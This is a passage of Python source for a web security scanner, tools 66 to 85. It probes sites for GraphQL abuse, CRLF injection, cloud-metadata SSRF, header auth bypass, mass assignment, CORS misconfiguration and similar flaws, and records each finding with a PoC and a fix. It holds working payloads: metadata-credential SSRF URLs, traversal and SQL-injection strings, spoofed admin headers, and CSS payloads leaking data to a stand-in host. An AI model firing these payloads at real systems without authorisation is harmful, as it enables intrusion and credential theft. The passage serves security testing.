                     "/.well-known/change-password","/bugbounty",
                     "/responsible-disclosure","/vulnerability-disclosure"]
        found = []; policy = {}
        for path in vdp_paths:
            code, body, hdrs = _fetch(base+path, cfg.user_agent, cfg.timeout)
            if code == 200 and len(body) > 10:
                ok(f"  VDP/Security.txt found: {path}")
                found.append({"path":path,"body":body[:500]})
                # Parse security.txt fields
                for line in body.splitlines():
                    line = line.strip()
                    for field in ["Contact:","Expires:","Encryption:","Acknowledgments:","Policy:","Hiring:","Scope:"]:
                        if line.startswith(field):
                            policy[field.rstrip(":")] = line[len(field):].strip()
                            ok(f"  {line}")
        if policy.get("Contact"):
            ok(f"  Bug reports: {policy['Contact']}")
        if not found:
            warn(f"  No security.txt found at {profile.host} — consider adding one (RFC 9116)")
            profile.findings.append(Finding(
                id="F-VDP-001", title="No security.txt / Vulnerability Disclosure Policy",
                severity="INFO", cwe="CWE-200", cvss=0.0,
                description="No security.txt file found. Researchers have no official contact for vulnerability reports.",
                evidence=f"Checked: {vdp_paths}",
                reproduction=f"curl -sk '{base}/.well-known/security.txt'",
                poc_curl=f"curl -sk '{base}/.well-known/security.txt'",
                category="VDP",
                remediation="Create /.well-known/security.txt per RFC 9116 with Contact: and Policy: fields."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOLS 66-105 — 40 Advanced Red Team Skills (Phase 9)
# ══════════════════════════════════════════════════════════════

# ── Tool 66: GraphQL Batch / Alias DoS (SKILL-76) ────────────
class GraphQLBatchAttack:
    """Detect unbounded GraphQL batching, alias amplification, and query depth."""
    NAME = "GraphQL Batch Attack"
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        gql_endpoints = ["/graphql", "/api/graphql", "/gql", "/query",
                         "/graphql/v1", "/v1/graphql", "/api/v1/graphql"]
        batch_payload = json.dumps([
            {"query": "{ __typename }"},
            {"query": "{ __typename }"},
            {"query": "{ __typename }"},
        ]).encode()
        alias_payload = json.dumps({"query":
            " ".join(f"q{i}: __typename" for i in range(50))
        }).encode()
        depth_payload = json.dumps({"query":
            "{ a { a { a { a { a { a { a { a { a { a { __typename } } } } } } } } } } }"
        }).encode()
        for ep in gql_endpoints:
            url = profile.url.rstrip("/") + ep
            for label, payload in [("batch", batch_payload), ("alias50", alias_payload), ("depth10", depth_payload)]:
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout, "POST", payload,
                               {"Content-Type": "application/json"})
                    if r and r.status < 500 and b"data" in (r.body or b""):
                        profile.findings.append(Finding(
                            id=f"GQL-BATCH-{label.upper()}",
                            title=f"GraphQL {label} not rejected",
                            severity="MEDIUM",
                            cvss=5.3,
                            cwe="CWE-770",
                            description=f"GraphQL endpoint {ep} accepted {label} payload without restriction.",
                            poc_curl=f"curl -sk -X POST {url} -H 'Content-Type: application/json' -d '{payload.decode()[:80]}...'",
                            category="GraphQL",
                            remediation="Enforce query depth/complexity limits and disable batching in production."
                        ))
                        break
                except Exception:
                    pass
        return profile

# ── Tool 67: Subresource Integrity Checker (SKILL-77) ─────────
class SRIChecker:
    """Detect CDN scripts/styles loaded without Subresource Integrity (SRI)."""
    NAME = "SRI Checker"
    CDN_PAT = re.compile(
        r'<(?:script|link)[^>]+(?:src|href)=["\']https?://(?!(?:www\.)?'
        r'(?:localhost|127\.0\.0\.1))[^"\']+["\'][^>]*>', re.I)
    SRI_PAT = re.compile(r'integrity=["\']sha', re.I)
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        r = _fetch(profile.url, cfg.ua, cfg.timeout)
        if not r or not r.body:
            return profile
        body = r.body.decode("utf-8", errors="replace")
        for m in self.CDN_PAT.finditer(body):
            tag = m.group(0)
            if not self.SRI_PAT.search(tag):
                src = re.search(r'(?:src|href)=["\']([^"\']+)', tag, re.I)
                url_val = src.group(1) if src else tag[:60]
                profile.findings.append(Finding(
                    id="SRI-MISSING",
                    title="CDN resource loaded without SRI",
                    severity="LOW",
                    cvss=3.7,
                    cwe="CWE-494",
                    description=f"External resource loaded without integrity attribute: {url_val[:100]}",
                    poc_curl=f"curl -sk {profile.url} | grep -i 'cdn\\|cloudflare\\|jquery\\|bootstrap' | grep -v integrity",
                    category="Client-Side Security",
                    remediation="Add integrity='sha384-...' crossorigin='anonymous' to all third-party script/link tags."
                ))
        return profile

# ── Tool 68: postMessage Analyzer (SKILL-78) ──────────────────
class PostMessageAnalyzer:
    """Detect insecure postMessage origin validation in JavaScript."""
    NAME = "postMessage Analyzer"
    UNSAFE = re.compile(
        r'addEventListener\s*\(\s*["\']message["\'].*?(?:event\.data|e\.data)',
        re.S | re.I)
    ORIGIN_CHECK = re.compile(r'event\.origin|e\.origin|message\.origin', re.I)
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        r = _fetch(profile.url, cfg.ua, cfg.timeout)
        if not r or not r.body:
            return profile
        body = r.body.decode("utf-8", errors="replace")
        js_urls = list(dict.fromkeys(
            re.findall(r'(?:src)=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', body, re.I)[:8]))
        for js_url in js_urls:
            abs_url = js_url if js_url.startswith("http") else profile.url.rstrip("/") + "/" + js_url.lstrip("/")
            try:
                rj = _fetch(abs_url, cfg.ua, cfg.timeout)
                if not rj or not rj.body:
                    continue
                src = rj.body.decode("utf-8", errors="replace")
                if self.UNSAFE.search(src) and not self.ORIGIN_CHECK.search(src):
                    profile.findings.append(Finding(
                        id="POSTMSG-NO-ORIGIN",
                        title="postMessage handler missing origin check",
                        severity="MEDIUM",
                        cvss=6.1,
                        cwe="CWE-346",
                        description=f"JavaScript file {abs_url[:80]} uses postMessage listener without validating event.origin.",
                        poc_curl=f"# In attacker page: window.open('{profile.url}').postMessage('{{\"action\":\"admin\"}}','*')",
                        category="Client-Side Security",
                        remediation="Always validate event.origin against an allowlist before processing postMessage data."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 69: Web Cache Deception (SKILL-79) ──────────────────
class WebCacheDeception:
    """Test for web cache deception via static-extension path confusion."""
    NAME = "Web Cache Deception"
    EXTS = [".css", ".jpg", ".png", ".js", ".woff2"]
    ACCT_PATHS = ["/account", "/profile", "/dashboard", "/me",
                  "/api/me", "/api/profile", "/api/user/me"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for acct in self.ACCT_PATHS:
            for ext in self.EXTS[:3]:
                url = profile.url.rstrip("/") + acct + ext
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if not r:
                        continue
                    cc = r.headers.get("cache-control", "")
                    via = r.headers.get("via", "") + r.headers.get("x-cache", "")
                    if r.status == 200 and ("public" in cc or "HIT" in via.upper()):
                        profile.findings.append(Finding(
                            id="WCD-ACCOUNT",
                            title="Web Cache Deception — account page cached with static extension",
                            severity="HIGH",
                            cvss=8.1,
                            cwe="CWE-525",
                            description=f"Authenticated endpoint {url} served as cached response (Cache-Control: {cc}). Attacker can trick victim into visiting this URL then retrieve cached sensitive data.",
                            poc_curl=f"curl -sk '{url}' -H 'Cookie: session=VICTIM_TOKEN'",
                            category="Cache",
                            remediation="Set Cache-Control: no-store on all authenticated endpoints. Use path-based cache rules."
                        ))
                except Exception:
                    pass
        return profile

# ── Tool 70: Service Worker Audit (SKILL-80) ─────────────────
class ServiceWorkerAudit:
    """Check for insecure service worker scope, stale cache, and fetch hijack."""
    NAME = "Service Worker Audit"
    SW_PATHS = ["/sw.js", "/service-worker.js", "/worker.js",
                "/js/sw.js", "/static/sw.js", "/app/sw.js"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.SW_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r or r.status != 200:
                    continue
                body = r.body.decode("utf-8", errors="replace") if r.body else ""
                issues = []
                if "fetch" in body and "credentials" in body:
                    issues.append("forwards credentials in fetch")
                if re.search(r'scope\s*[:=]\s*["\']/', body):
                    issues.append("root-scope registration")
                if "importScripts" in body:
                    ext_scripts = re.findall(r'importScripts\(["\']([^"\']+)["\']', body)
                    for s in ext_scripts:
                        if not profile.host in s:
                            issues.append(f"imports external script: {s[:60]}")
                if issues:
                    profile.findings.append(Finding(
                        id="SW-SECURITY",
                        title=f"Insecure service worker: {', '.join(issues[:2])}",
                        severity="MEDIUM",
                        cvss=5.9,
                        cwe="CWE-693",
                        description=f"Service worker at {url}: {'; '.join(issues)}",
                        poc_curl=f"curl -sk {url} | grep -E 'importScripts|credentials|scope'",
                        category="Client-Side Security",
                        remediation="Restrict SW scope, avoid root-scope, remove credential forwarding, only import same-origin scripts."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 71: HTTP Response Splitting / CRLF (SKILL-81) ────────
class CRLFInjectionScanner:
    """Test for CRLF injection in redirect and header-setting parameters."""
    NAME = "CRLF Injection Scanner"
    PAYLOADS = [
        "%0d%0aX-Injected: crlf-test",
        "%0aX-Injected:%20crlf-test",
        "%0d%0a%20X-Injected:%20crlf",
        "\r\nX-Injected: crlf-test",
        "%E5%98%8A%E5%98%8DX-Injected:%20crlf",
    ]
    PARAMS = ["redirect", "url", "next", "return", "returnUrl", "continue",
              "dest", "destination", "location", "target", "to", "r"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for param in self.PARAMS[:6]:
            for pl in self.PAYLOADS[:3]:
                url = profile.url.rstrip("/") + f"/?{param}={pl}"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if r and "x-injected" in r.headers:
                        profile.findings.append(Finding(
                            id="CRLF-INJECT",
                            title="CRLF injection in HTTP response headers",
                            severity="HIGH",
                            cvss=7.2,
                            cwe="CWE-93",
                            description=f"Parameter '{param}' reflects CRLF sequence, allowing header injection. Injected header 'X-Injected' appeared in response.",
                            poc_curl=f"curl -sk -v '{url}' 2>&1 | grep -i 'x-injected'",
                            category="Injection",
                            remediation="Strip CR/LF characters from all parameters used in Location, Set-Cookie, or any header context."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 72: SAML Vulnerability Scanner (SKILL-82) ────────────
class SAMLVulnScanner:
    """Detect SAML misconfiguration: XML signature wrapping, XXE, replay potential."""
    NAME = "SAML Vulnerability Scanner"
    SAML_PATHS = ["/saml/login", "/saml/sso", "/sso/saml", "/auth/saml",
                  "/api/auth/saml", "/saml/consume", "/saml/acs",
                  "/saml2/login", "/saml2/sso"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.SAML_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r:
                    continue
                if r.status in (200, 302, 400, 405, 422):
                    profile.findings.append(Finding(
                        id="SAML-ENDPOINT",
                        title=f"SAML endpoint exposed: {path}",
                        severity="INFO",
                        cvss=0.0,
                        cwe="CWE-287",
                        description=f"SAML endpoint {url} responded with HTTP {r.status}. Requires manual testing for XML signature wrapping (XSW), XXE, and assertion replay.",
                        poc_curl=f"curl -sk -X POST {url} -d 'SAMLResponse=BASE64_ENCODED_ASSERTION'",
                        category="Authentication",
                        remediation="Validate SAML signature before processing assertions. Disable XXE in XML parser. Enforce one-time-use with InResponseTo tracking."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 73: OAuth2 Implicit Flow Detector (SKILL-83) ─────────
class OAuth2ImplicitFlow:
    """Detect OAuth2 implicit flow (token in URL fragment) and missing PKCE."""
    NAME = "OAuth2 Implicit Flow"
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        oauth_paths = ["/oauth/authorize", "/oauth2/authorize",
                       "/auth/oauth", "/connect/authorize",
                       "/api/oauth/authorize", "/.well-known/oauth-authorization-server"]
        for path in oauth_paths:
            url = profile.url.rstrip("/") + path
            probe = url + "?response_type=token&client_id=test&redirect_uri=http://localhost&scope=openid"
            try:
                r = _fetch(probe, cfg.ua, cfg.timeout)
                if not r:
                    continue
                if r.status in (200, 302, 400):
                    body = r.body.decode("utf-8", errors="replace") if r.body else ""
                    loc = r.headers.get("location", "")
                    if "response_type" in probe.lower() or "access_token" in loc:
                        profile.findings.append(Finding(
                            id="OAUTH-IMPLICIT",
                            title="OAuth2 implicit flow (response_type=token) accepted",
                            severity="HIGH",
                            cvss=7.4,
                            cwe="CWE-522",
                            description=f"OAuth2 endpoint {path} accepted response_type=token (implicit flow). Access tokens in URL fragments are logged in browser history and Referer headers.",
                            poc_curl=f"curl -sk '{probe}'",
                            category="OAuth",
                            remediation="Disable implicit flow. Use authorization_code + PKCE (RFC 7636). Reject response_type=token requests."
                        ))
            except Exception:
                pass
        return profile

# ── Tool 74: Virtual Host Fuzzer (SKILL-84) ──────────────────
class VHostFuzzer:
    """Fuzz Host header for hidden virtual hosts returning different content."""
    NAME = "VHost Fuzzer"
    PROBE_HOSTS = ["admin", "internal", "dev", "staging", "api", "backend",
                   "test", "beta", "portal", "dashboard", "manage", "private"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        # Get baseline with real host
        baseline = _fetch(profile.url, cfg.ua, cfg.timeout)
        if not baseline:
            return profile
        base_len = len(baseline.body or b"")
        base_status = baseline.status
        apex = profile.apex
        for sub in self.PROBE_HOSTS:
            vhost = f"{sub}.{apex}"
            try:
                r = _fetch(profile.url, cfg.ua, cfg.timeout,
                           headers_extra={"Host": vhost})
                if not r:
                    continue
                diff = abs(len(r.body or b"") - base_len)
                if r.status != base_status or diff > 200:
                    profile.findings.append(Finding(
                        id=f"VHOST-{sub.upper()}",
                        title=f"Virtual host '{vhost}' returns different response",
                        severity="MEDIUM",
                        cvss=5.3,
                        cwe="CWE-284",
                        description=f"Host header fuzzing with '{vhost}' produced status {r.status} (baseline {base_status}), body diff {diff} bytes.",
                        poc_curl=f"curl -sk {profile.url} -H 'Host: {vhost}'",
                        category="Recon",
                        remediation="Validate and whitelist accepted Host header values. Return 421 for unrecognised virtual hosts."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 75: Race Condition Tester (SKILL-85) ────────────────
class RaceConditionTester:
    """Detect race condition windows on state-changing endpoints."""
    NAME = "Race Condition Tester"
    RACE_PATHS = ["/api/coupon/apply", "/api/redeem", "/api/transfer",
                  "/api/withdraw", "/api/vote", "/api/like",
                  "/api/checkout", "/api/order"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import threading
        results = []
        def probe(url):
            try:
                r = _fetch(url, cfg.ua, 5)
                if r:
                    results.append(r.status)
            except Exception:
                pass
        for path in self.RACE_PATHS:
            url = profile.url.rstrip("/") + path
            results.clear()
            threads = [threading.Thread(target=probe, args=(url,)) for _ in range(5)]
            for t in threads:
                t.start()
            for t in threads:
                t.join(timeout=6)
            if len(set(results)) > 1 and 200 in results:
                profile.findings.append(Finding(
                    id=f"RACE-{path.replace('/','_').upper()[:20]}",
                    title=f"Potential race condition window on {path}",
                    severity="HIGH",
                    cvss=7.5,
                    cwe="CWE-362",
                    description=f"5 simultaneous requests to {path} produced mixed responses: {set(results)}. May allow double-spend or privilege escalation.",
                    poc_curl="\n".join([f"curl -sk -X POST {url} &" for _ in range(5)] + ["wait"]),
                    category="Business Logic",
                    remediation="Use database transactions with row-level locking. Implement idempotency keys on sensitive endpoints."
                ))
        return profile

# ── Tool 76: Token Leakage Scanner (SKILL-86) ─────────────────
class TokenLeakageScanner:
    """Detect auth tokens leaking in URLs, Referer headers, and JS globals."""
    NAME = "Token Leakage Scanner"
    TOKEN_PAT = re.compile(
        r'(?:token|access_token|api_key|apikey|auth|bearer|jwt|session)'
        r'\s*[=:]\s*["\']?([A-Za-z0-9\-_\.]{20,})', re.I)
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        r = _fetch(profile.url, cfg.ua, cfg.timeout)
        if not r:
            return profile
        # Check if tokens appear in Location redirect URL
        loc = r.headers.get("location", "")
        if self.TOKEN_PAT.search(loc):
            profile.findings.append(Finding(
                id="TOKEN-LEAK-REDIRECT",
                title="Auth token exposed in redirect URL",
                severity="HIGH",
                cvss=7.5,
                cwe="CWE-598",
                description=f"Location header contains token-like value: {loc[:100]}",
                poc_curl=f"curl -sk -v {profile.url} 2>&1 | grep -i 'location'",
                category="Authentication",
                remediation="Never pass tokens in URL parameters. Use POST body or HTTP headers for token exchange."
            ))
        # Check HTML body for inline tokens
        body = r.body.decode("utf-8", errors="replace") if r.body else ""
        for m in self.TOKEN_PAT.finditer(body):
            val = m.group(1)[:40]
            profile.findings.append(Finding(
                id="TOKEN-LEAK-BODY",
                title="Auth token/credential exposed in page body",
                severity="HIGH",
                cvss=7.5,
                cwe="CWE-312",
                description=f"Sensitive value found in response body near '{m.group(0)[:60]}'",
                poc_curl=f"curl -sk {profile.url} | grep -iE 'token|api_key|bearer'",
                category="Authentication",
                remediation="Remove credentials from HTML/JS. Use httpOnly cookies or Authorization header flow."
            ))
            break
        return profile

# ── Tool 77: Cloud Metadata SSRF (SKILL-87) ──────────────────
class CloudMetadataSSRF:
    """Generate SSRF payloads targeting cloud metadata endpoints."""
    NAME = "Cloud Metadata SSRF"
    META_URLS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://100.100.100.200/latest/meta-data/",
        "http://fd00:ec2::254/latest/meta-data/",
    ]
    SSRF_PARAMS = ["url", "src", "image", "path", "proxy", "fetch",
                   "redirect", "uri", "href", "resource", "load"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for param in self.SSRF_PARAMS[:5]:
            for meta_url in self.META_URLS[:3]:
                probe = profile.url.rstrip("/") + f"/?{param}={meta_url}"
                try:
                    r = _fetch(probe, cfg.ua, 8)
                    if r and r.body:
                        body = r.body.decode("utf-8", errors="replace")
                        if any(k in body for k in ["ami-id", "instance-id", "security-credentials",
                                                    "computeMetadata", "subscriptionId"]):
                            profile.findings.append(Finding(
                                id="SSRF-CLOUD-META",
                                title="SSRF reaching cloud metadata endpoint",
                                severity="CRITICAL",
                                cvss=9.8,
                                cwe="CWE-918",
                                description=f"Parameter '{param}' fetched cloud metadata from {meta_url}. Response contains IAM/instance data.",
                                poc_curl=f"curl -sk '{probe}'",
                                category="SSRF",
                                remediation="Block IMDS IP ranges in egress firewall. Use IMDSv2 with PUT-based token. Validate/whitelist SSRF targets."
                            ))
                            return profile
                except Exception:
                    pass
        # Issue informational PoC list regardless
        profile.findings.append(Finding(
            id="SSRF-META-PROBE",
            title="Cloud metadata SSRF payloads generated (manual verification required)",
            severity="INFO",
            cvss=0.0,
            cwe="CWE-918",
            description="SSRF parameters probed for cloud metadata leakage. No confirmed hit in automated scan — manual verification needed with burp collaborator.",
            poc_curl="\n".join(f"curl -sk '{profile.url.rstrip('/')}/?url={u}'" for u in self.META_URLS),
            category="SSRF",
            remediation="Implement SSRF allowlist. Block RFC1918 + 169.254.0.0/16 ranges in outbound requests."
        ))
        return profile

# ── Tool 78: ETag Inode Leakage (SKILL-88) ────────────────────
class ETagLeakage:
    """Detect Apache-style ETag headers exposing inode numbers."""
    NAME = "ETag Leakage"
    INODE_PAT = re.compile(r'^[0-9a-f]+-[0-9a-f]+-[0-9a-f]+$', re.I)
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in ["/", "/index.html", "/robots.txt", "/favicon.ico"]:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r:
                    continue
                etag = r.headers.get("etag", "").strip('"')
                if etag and self.INODE_PAT.match(etag):
                    parts = etag.split("-")
                    if len(parts) == 3:
                        profile.findings.append(Finding(
                            id="ETAG-INODE",
                            title="Apache ETag exposes inode number",
                            severity="LOW",
                            cvss=3.7,
                            cwe="CWE-200",
                            description=f"ETag '{etag}' at {url} matches Apache inode-size-mtime format. Inode: {int(parts[0],16)}",
                            poc_curl=f"curl -sk -I {url} | grep -i etag",
                            category="Information Disclosure",
                            remediation="Set FileETag MTime Size in Apache config to remove inode from ETag. Or use FileETag None and custom ETags."
                        ))
                        break
            except Exception:
                pass
        return profile

# ── Tool 79: API Auth Bypass via Headers (SKILL-89) ──────────
class APIAuthBypassHeaders:
    """Test for auth bypass via X-Auth-User, X-Remote-User, X-Forwarded-User headers."""
    NAME = "API Auth Bypass Headers"
    BYPASS_HEADERS = [
        {"X-Auth-User": "admin"},
        {"X-Remote-User": "admin"},
        {"X-Forwarded-User": "admin"},
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-WAP-Profile": "http://127.0.0.1/wap"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"Client-IP": "127.0.0.1"},
    ]
    ADMIN_PATHS = ["/admin", "/api/admin", "/management", "/internal",
                   "/api/internal", "/private", "/api/private"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.ADMIN_PATHS[:4]:
            base_url = profile.url.rstrip("/") + path
            try:
                baseline = _fetch(base_url, cfg.ua, cfg.timeout)
                if not baseline or baseline.status not in (401, 403):
                    continue
            except Exception:
                continue
            for hdrs in self.BYPASS_HEADERS:
                try:
                    r = _fetch(base_url, cfg.ua, cfg.timeout, headers_extra=hdrs)
                    if r and r.status not in (401, 403, 404):
                        hdr_str = ", ".join(f"{k}: {v}" for k, v in hdrs.items())
                        profile.findings.append(Finding(
                            id=f"AUTH-BYPASS-HDR",
                            title=f"Auth bypass via header: {hdr_str}",
                            severity="CRITICAL",
                            cvss=9.1,
                            cwe="CWE-290",
                            description=f"Path {path} returned HTTP {r.status} with header {hdr_str}, bypassing 401/403 restriction.",
                            poc_curl=f"curl -sk {base_url} -H '{list(hdrs.keys())[0]}: {list(hdrs.values())[0]}'",
                            category="Access Control",
                            remediation="Never use untrusted client headers for authentication. Strip all X-Auth-* headers at the load balancer."
                        ))
                        break
                except Exception:
                    pass
        return profile

# ── Tool 80: Path Parameter Injection (SKILL-90) ─────────────
class PathParameterInjection:
    """Inject into REST path parameters for IDOR, traversal, and type confusion."""
    NAME = "Path Parameter Injection"
    ID_PAT = re.compile(r'/(\d{1,10})(?:/|$)')
    INJECT = ["0", "-1", "null", "undefined", "true", "%00", "../../etc/passwd",
              "1 OR 1=1", "1; DROP TABLE users--", "99999999999999"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        if not profile.js_endpoints:
            return profile
        tested = set()
        for ep in list(profile.js_endpoints)[:20]:
            m = self.ID_PAT.search(ep)
            if not m:
                continue
            base = ep[:m.start(1)]
            suffix = ep[m.end(1):]
            for val in self.INJECT[:5]:
                url = profile.url.rstrip("/") + base + val + suffix
                if url in tested:
                    continue
                tested.add(url)
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if not r:
                        continue
                    body = r.body.decode("utf-8", errors="replace") if r.body else ""
                    if r.status == 200 and any(k in body for k in ["root:", "SELECT", "error", "exception"]):
                        profile.findings.append(Finding(
                            id="PATH-PARAM-INJECT",
                            title=f"Path parameter injection on {base}{{id}}{suffix}",
                            severity="HIGH",
                            cvss=7.5,
                            cwe="CWE-20",
                            description=f"Path parameter value '{val}' produced unexpected 200 with suspicious content at {url[:80]}",
                            poc_curl=f"curl -sk '{url}'",
                            category="Injection",
                            remediation="Validate path parameters: enforce type (integer), range, and existence checks before processing."
                        ))
                        break
                except Exception:
                    pass
        return profile

# ── Tool 81: HTTP Trace XST (SKILL-91) ───────────────────────
class HTTPTraceXST:
    """Detect Cross-Site Tracing (XST) via TRACE method + HttpOnly cookie reflection."""
    NAME = "HTTP Trace XST"
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        url = profile.url
        try:
            r = _fetch(url, cfg.ua, cfg.timeout, "TRACE",
                       headers_extra={"X-Custom-Header": "xst-probe-12345"})
            if not r:
                return profile
            body = r.body.decode("utf-8", errors="replace") if r.body else ""
            if r.status == 200 and "xst-probe-12345" in body:
                profile.findings.append(Finding(
                    id="XST-TRACE",
                    title="TRACE method enabled — Cross-Site Tracing (XST) possible",
                    severity="LOW",
                    cvss=4.3,
                    cwe="CWE-16",
                    description="TRACE method is enabled and reflects request headers including custom values. Combined with XSS this allows HttpOnly cookie theft.",
                    poc_curl=f"curl -sk -X TRACE {url} -H 'X-Custom-Header: test'",
                    category="HTTP Methods",
                    remediation="Disable TRACE method on all HTTP servers. Add 'TraceEnable Off' (Apache) or 'if ($request_method = TRACE)' deny (nginx)."
                ))
        except Exception:
            pass
        return profile

# ── Tool 82: CSS Injection / Exfiltration (SKILL-92) ─────────
class CSSInjectionScanner:
    """Detect CSS injection via unescaped values in style attributes or CSS endpoints."""
    NAME = "CSS Injection Scanner"
    CSS_PAY = [
        "}</style><style>*{background:url(//x.x/css?leak=",
        "');background:url(//x.x/?l=",
        "-moz-binding:url(//x.x/xss.xml#xss)",
        "expression(alert(1))",
        "\\:expression(alert(1))",
    ]
    CSS_PARAMS = ["color", "theme", "style", "css", "bg", "background",
                  "class", "font", "skin", "layout"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for param in self.CSS_PARAMS[:5]:
            for pl in self.CSS_PAY[:3]:
                url = profile.url.rstrip("/") + f"/?{param}={pl}"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if not r or not r.body:
                        continue
                    body = r.body.decode("utf-8", errors="replace")
                    if any(pl_part in body for pl_part in ["expression(", "-moz-binding", "url(//x.x"]):
                        profile.findings.append(Finding(
                            id="CSS-INJECT",
                            title=f"CSS injection via parameter '{param}'",
                            severity="MEDIUM",
                            cvss=6.1,
                            cwe="CWE-74",
                            description=f"Parameter '{param}' reflects CSS payload unescaped. Allows style injection, data exfiltration via attribute selectors.",
                            poc_curl=f"curl -sk '{url}'",
                            category="Injection",
                            remediation="Escape CSS special characters. Use a strict CSS allowlist for user-controlled values. Implement CSP."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 83: CORS Credential Exposure (SKILL-93) ─────────────
class CORSCredentialExposure:
    """Test for CORS misconfiguration with credentials: include + wildcard/reflected origin."""
    NAME = "CORS Credential Exposure"
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        api_paths = ["/api/me", "/api/user", "/api/profile",
                     "/api/v1/user", "/api/v2/user", "/api/account", profile.url]
        evil_origin = "https://evil.example.com"
        for path in api_paths[:5]:
            url = path if path.startswith("http") else profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout,
                           headers_extra={"Origin": evil_origin,
                                          "Cookie": "test=probe"})
                if not r:
                    continue
                acao = r.headers.get("access-control-allow-origin", "")
                acac = r.headers.get("access-control-allow-credentials", "")
                if ("true" in acac.lower()) and (acao == evil_origin or acao == "*"):
                    profile.findings.append(Finding(
                        id="CORS-CRED-EXPOSE",
                        title="CORS allows credentials from arbitrary origin",
                        severity="CRITICAL",
                        cvss=9.3,
                        cwe="CWE-942",
                        description=f"Endpoint {url} responds with ACAO: {acao} and ACAC: {acac}. Any origin can make credentialed cross-origin requests.",
                        poc_curl=(
                            f"# Attacker page JS:\n"
                            f"fetch('{url}', {{credentials:'include'}}).then(r=>r.text()).then(console.log)"
                        ),
                        category="CORS",
                        remediation="Never combine Access-Control-Allow-Credentials: true with a dynamically reflected or wildcard origin."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 84: Mass Assignment Fuzzer (SKILL-94) ───────────────
class MassAssignmentFuzzer:
    """Inject hidden privileged fields in JSON API requests."""
    NAME = "Mass Assignment Fuzzer"
    PRIV_FIELDS = [
        {"role": "admin"},
        {"is_admin": True},
        {"isAdmin": True},
        {"admin": True},
        {"user_type": "admin"},
        {"userType": "ADMIN"},
        {"permissions": ["admin", "root"]},
        {"privilege": "superuser"},
        {"balance": 999999},
        {"credit": 999999},
        {"verified": True},
        {"active": True},
        {"email_verified": True},
    ]
    ENDPOINTS = ["/api/user", "/api/profile", "/api/account",
                 "/api/register", "/api/v1/user", "/api/v2/user"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for ep in self.ENDPOINTS[:4]:
            url = profile.url.rstrip("/") + ep
            for fields in self.PRIV_FIELDS[:5]:
                payload = json.dumps({"username": "testuser", "email": "test@test.com",
                                      "password": "Test1234!", **fields}).encode()
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout, "POST", payload,
                               {"Content-Type": "application/json"})
                    if r and r.status in (200, 201):
                        body = r.body.decode("utf-8", errors="replace") if r.body else ""
                        key = list(fields.keys())[0]
                        if key in body or str(list(fields.values())[0]).lower() in body.lower():
                            profile.findings.append(Finding(
                                id="MASS-ASSIGN",
                                title=f"Mass assignment — privileged field '{key}' accepted",
                                severity="HIGH",
                                cvss=8.1,
                                cwe="CWE-915",
                                description=f"POST {ep} accepted extra field '{key}': {fields[key]} and reflected it in the response body.",
                                poc_curl=f"curl -sk -X POST {url} -H 'Content-Type: application/json' -d '{payload.decode()}'",
                                category="Access Control",
                                remediation="Use explicit allowlist (DTO/schema) for accepted fields. Block all unlisted properties at the model layer."
                            ))
                            return profile
                except Exception:
                    pass
        return profile

# ── Tool 85: JWT JWK Set URI Poisoning (SKILL-95) ─────────────
class JWKSPoisoning:
    """Detect JWT jku/x5u header injection and JWKS endpoint exposure."""
    NAME = "JWKS Poisoning"
    JWKS_PATHS = ["/.well-known/jwks.json", "/api/jwks", "/auth/jwks",
                  "/oauth/jwks", "/jwks.json", "/oauth2/v3/certs",
                  "/.well-known/openid-configuration"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.JWKS_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r or r.status != 200:
